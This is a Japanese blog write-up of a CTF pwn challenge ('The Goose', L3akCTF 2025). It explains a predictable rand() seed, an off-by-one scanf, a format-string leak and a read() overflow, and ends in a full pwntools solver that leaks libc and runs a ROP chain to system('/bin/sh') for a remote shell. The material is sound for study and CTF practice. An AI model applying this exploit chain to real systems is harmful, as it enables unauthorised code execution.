---
layout: post
title: "L3akCTF 2025 - pwn / The Goose(jp)"
date: 2025-07-15 04:54:07 +0900
categories: writeups
tags: [CTF, pwn, format string, buffer overflow, rand]
---
# . TL;DR(ざっくり解説)
***
ガチョウが何回鳴くかを当てるゲーム🪿🪿  

`rand()`の結果をリークするかor再現して鳴き声の回数を当てる。  
Format string attackでlibcのアドレスをリーク。  
`read()`のバッファオーバーフローでROPを実行して、`system("/bin/sh")`でflagを獲得🔥
<br><br>

# 問題について
***
<br>

**[説明文]**  
When the honking gets tough, you better brush up on your basics.  

**[配布ファイル]**  
・`chall`:実行ファイル  
・`Dockerfile`:実行環境作成  

**[処理の流れ]**  
1.名前の入力  
→  
2.ガチョウの鳴く回数を入力(当たってれば成功⭕間違ってればゲーム終了❌)  
→  
3.名前の再入力  
→  
4.勝利メッセージの入力  
<br>
![実行ファイルイメージ](/assets/images/1.png)
<br><br>

**[🎯目的]**  
リモートで動いてる`chall`にリクエストを投げて、
`/srv/flag.txt`を獲得する🔥
<br><br><br>

# 今回の脆弱性
***
<br>

**1-a.再現可能なseed値**  
rand関数において、同じseed値で乱数生成した場合、同じ数が作れる。  
今回はシステム時刻がseed値となっているため、攻撃者側も再現できちゃう。  
[OWASP:Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)
<br><br>

**1-b.変数と読み込みサイズの不整合**  
scanf関数において、入力値の後に`NUL(0x00)`が自動で付与される。  
しかし、今回のケースでは`username`の長さと読み込みサイズが同じであるため、  
64文字以上入力された場合に`NUL(0x00)`が入らない。  
結果として、`username`と`nhonks`の境界がないため、次の変数まで参照できてしまう。  

具体的にみていくと。。。

```c
char username[63];  
scanf("%64s", &username);  
```
### 例: "a"を63回入力した場合

```c
0x555555558080 <username>:      0x6161616161616161      0x6161616161616161
0x555555558090 <username+16>:   0x6161616161616161      0x6161616161616161
0x5555555580a0 <username+32>:   0x6161616161616161      0x6161616161616161
0x5555555580b0 <username+48>:   0x6161616161616161      0x0061616161616161
0x5555555580c0 <nhonks>:        0x0000000000000040      0x0000000000000000

$ x/s 0x555555558080
0x555555558080 <username>:      'a' <repeats 63 times>
```

### 例: "a"を64回以上入力した場合

`username`と`nhonks`の間にNULがないため、`username`参照時に`@(0x40)`まで参照される😱

```c
0x555555558080 <username>:      0x6161616161616161      0x6161616161616161
0x555555558090 <username+16>:   0x6161616161616161      0x6161616161616161
0x5555555580a0 <username+32>:   0x6161616161616161      0x6161616161616161
0x5555555580b0 <username+48>:   0x6161616161616161      0x6161616161616161
0x5555555580c0 <nhonks>:        0x0000000000000040      0x0000000000000000

$ x/s 0x555555558080
0x555555558080 <username>:      'a' <repeats 64 times>, "@"
```
<br>

**2-a.書式指定子の設定漏れ**  
printf関数等に書式指定子を設定しない場合、スタックの参照、メモリ書き換えが可能となる。  
[OWASP:Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)

```c
printf(local_f8);
```
<br>

**3-a.read関数の読み込みサイズ誤り**  
`read(0, buf, 0x400);`で、指定したバッファを超えた値を読み込むため、バッファオーバーフローになってしまう。  
<br>
今回のケースだと`local_178`の開始アドレスが、`0x7ffcbf15aae0`であるため  
main関数へのリターンアドレスの上書きができてしまう🔥

```c
0x7ffcbf15aae0: 0x0000000000000000      0x0000000000000000
0x7ffcbf15aaf0: 0x0000000000000000      0x0000000000000000
0x7ffcbf15ab00: 0x0000000000000002      0x8000000000000006
...
0x7ffcbf15ac30: 0x656c206f7420656b      0x74206f7420657661
0x7ffcbf15ac40: 0x646c726f77206568      0x000000470000003f
0x7ffcbf15ac50: 0x00007ffcbf15ac70      0x00005dd83e3a8481　← リターンアドレスの 上書き可能
```
<br>

# いざ対決⚔️⚔️
***
<br>

**1.ファイルの解析**  
デコンパイルやセキュリティ機構、動的ライブラリの使用を確認
```sh
$ ghidra
```
<br>
ghidraでは関数の流れと、乱数の部分や読み込み部分を見ていく。

<br><br>
![ghidra1](/assets/images/2.png)
<br><br>
![ghidra2](/assets/images/3.png)
<br><br>
![ghidra2](/assets/images/6.png)
<br><br>

lddでライブラリを使ってるか、checksecでcanaryやPIEの有無を確認した。


```shell
$ ldd chall
    linux-vdso.so.1 (0x00007ffe90b29000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000071b1f5a8c000)
    /lib64/ld-linux-x86-64.so.2 (0x000071b1f5c8b000)

$ checksec chall
[*] '/home/xxxx/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
<br>

**2.攻撃方法の整理**

(1) 乱数の取得  
1-aで同じシードで乱数を再現させるか、1-bで乱数を流出させるかの2パターンあったのだけど   
イベント中は1-bに気がつかなかったため、乱数を再現させる方法を採用。  

(2) flagの取得  
flagを直接参照できる関数などは用意されていなかったので、
ROPでsystem("/bin/sh")の実行を目指す。

(3) libcアドレスのリーク  
Format Strings attackでlibcアドレスをリークする。

(4) libcファイルの取得  
使用するlibcにごとにオフセット値が異なるため、  
dockerファイルからコンテナを作成し、リモート先で使用しているlibcファイルを取得する。
※もっといい方法があるかもなんだけど、今の知識だとこれしか方法が分からなかった🫠


<br>

**3.乱数の再現**  

以下で実装

```python
seed = int(time.time())
#seed += xx              # リモート環境の場合はラグを考慮して誤差+1,+2
local_libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
local_libc.srand(seed)  
HONK_cnt = local_libc.rand() % 0x5b + 10 #本問題では  ガチョウが鳴く回数 = 乱数 % 0x5b + 10 を しているため。 
```

**4.libcファイルの取得**  
dockerコンテナを作成し、libcファイルをコピー
```shell
$ docker build -t goose .
$ docker run --name goose -itd goose /bin/sh
$ docker cp goose:/srv/lib/x86_64-linux-gnu/libc.so.6 ./
```
<br>

**5.ROPchainの作成**  
`system("/bin/sh")`を実行するためのROPchainを作る。

`ret` ※ アラインメント調整用  
→    
`pop rdi;ret`  
→  
`"/bin/sh"`  
→  
`system()`  

<br>

**6.関数/文字列/gadgetのオフセット値の取得**  

```sh
#リモート環境用
#libc_file = "/home/xxxx/goose/libc.so.6"
#ローカル環境用
libc_file = "/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_file, checksec=False)
rop = ROP(libc)
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret']).address
ret_offset = rop.find_gadget(['ret']).address
```

<br><br>

**7.solver.py**  

```python
#!/usr/bin/python3
from pwn import *
from Crypto.Util.number import *
from Crypto.Random import *
import ctypes
import time
import re

#program & connect infomation
file = "./chall"
binary = ELF(file, checksec=False)
context.binary= file
#context.log_level = 'debug'
server= 'XX.XX.XX.XX'
port = 9999


#case:remote
session = remote(server,port)
seed += 2                                 # account for the time lag +2
libc_file = "/home/xxxx/goose/libc.so.6"  # get the libc file from docker machine 

#case:local
#session = process(file)
#libc_file = "/lib/x86_64-linux-gnu/libc.so.6"

#startline
print("---------------------------------------------------------------")

#seed
seed = int(time.time())
local_libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
local_libc.srand(seed)
HONK_cnt = local_libc.rand() % 0x5b + 10
print(f"honk_num:{HONK_cnt},time={seed}")
print("---------------------------------------------------------------")

#1st:conversation
wait_messages = b"> "
session.recvuntil(wait_messages)
payload = b"any"
session.sendline(payload)

#2nd:HONKS count guessing
wait_messages = b"how many honks?"
session.recvuntil(wait_messages)
payload = str(HONK_cnt).encode()
session.sendline(payload)

#receive all
res=b""
while True:
    try:
        chunk = session.recv(timeout=0.5)
        if not chunk:
            break
        res += chunk
    except EOFError:
        break

print(f"HONK_messages:{res.decode()}")
print("---------------------------------------------------------------")

#judge
keyword = b"what's your name again?"
if res.find(keyword) == -1:
    print("HONKS count is incorrect :( Please retry...")
    exit()
else:
    print("HONKS count is correct! :D")

print("---------------------------------------------------------------")

#3rd: leak the libc address
payload = b"%57$p"  # from saved rip
session.sendline(payload)
res = session.recv().decode()
addresses = re.findall(r"0x[0-9a-fA-F]+", res)             #leak address : libc_start_call_main +122
libc_start_main_addr = int(addresses[0], 16) - 122 + 0xb0  #__libc_start_main = libc_start_call_main + 0xb0  


#gadget calculation
libc = ELF(libc_file, checksec=False)
rop = ROP(libc)
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret']).address
ret_offset = rop.find_gadget(['ret']).address

libc_base_addr = libc_start_main_addr - libc_start_main_offset
system_addr = libc_base_addr + system_offset
binsh_addr = libc_base_addr + binsh_offset
pop_rdi_ret = libc_base_addr + pop_rdi_ret_offset 
ret = libc_base_addr + ret_offset

print(f"libc_base_addr:{hex(libc_base_addr)}")
print(f"system_addr:{hex(system_addr)}")
print(f"binsh_addr:{hex(binsh_addr)}")
print(f"pop_rdi_ret:{hex(pop_rdi_ret)}")
print(f"ret:{hex(ret)}")

print("---------------------------------------------------------------")

#4th:ROP chain
payload = b"A" * 376
payload += p64(ret) #
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
session.sendline(payload)
session.interactive()
```
<br><br>
# 感想
***
今回の問題は、pwnの基礎的な知識の総集編みたいな感じで楽しかった！  
libc部分とかがまだ曖昧なのと長めなsolverになってしまったのでもうちょっと頑張りたいな😆
<br>


